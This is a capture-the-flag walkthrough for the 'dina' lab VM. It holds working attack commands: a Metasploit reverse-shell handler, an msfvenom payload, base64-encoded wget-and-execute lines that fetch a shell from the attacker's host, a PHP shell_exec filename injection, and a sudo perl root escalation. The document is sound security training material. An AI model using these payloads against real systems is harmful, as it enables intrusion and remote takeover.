@@ -1,0 +1,57 @@
+
+Hack the dina VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as dina. The credit for making this vm machine goes to “Touhid Shaikh” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.104 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration.
+nmap -sV 192.168.1.104
+
+Nmap scan shows us port 80 is open, so we open the ip address in our browser.
+
+We don’t find anything on the web page. So we use dirb to find the directories for more information.
+dirb http://192.168.1.104/
+
+We find robots.txt, we open robots.txt in our browser and name of the directories of the server.
+
+We open nothing/ directory and find a 404 page. We take a look at the source code of the webpage and find a few passwords.
+
+Now we open secure/ directory that we found using dirb. Inside the directory we find a zip file we download it in our system.
+
+After download it in our system we try to unzip it but it prompts for password. So we try one of the passwords that we found earlier inside the web-page. The password turns out to be ‘freedom’
+
+Now after we extract the file we find a mp3 file. We check the file type and find out it is actually a ascii file. We open it and find a username and a name of directory.
+
+Now we open the directory and find a login page. We use one of the passwords from the web-page.
+We use username touhid and find password to be diana.
+
+After logging in we find that the author has created a vulnerable application. The details of how to exploit this vulnerability are given by the author here.
+
+First we setup our listener using metasploit.
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.124
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > run
+
+Now we create our payload using msfvenom
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.124 lport=4444 -f elf > /var/www/html/shell
+
+Now we convert our commands to upload the shell to base64 to bypass the firewall.
+echo ‘wget http://192.168.1.124/shell  -O /tmp/shell’ |base64
+echo ‘chmod 777 /tmp/shell’ |base64
+echo ‘/tmp/shell’ |base64
+
+Now to execute the upload our shell we change the name of the file with our php code to execute our shell commands. We use the the following code to replace the name of the file we upload.
+<?php shell_exec(base64_decode(‘base64encodestring’)); die();?>\”.php 
+
+Now as soon as we execute our shell we get reverse connection. Now we take a look at the sudoers list and we find that we have access to perl. So we spawn our shell using perl.
+sudo -l 
+sudo perl -e “exec ‘/bin/sh’”
+
+Now we go to root folder and we find the final flag. When we open the flag we find a message congratulating us on the completion of the challenge.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+ 
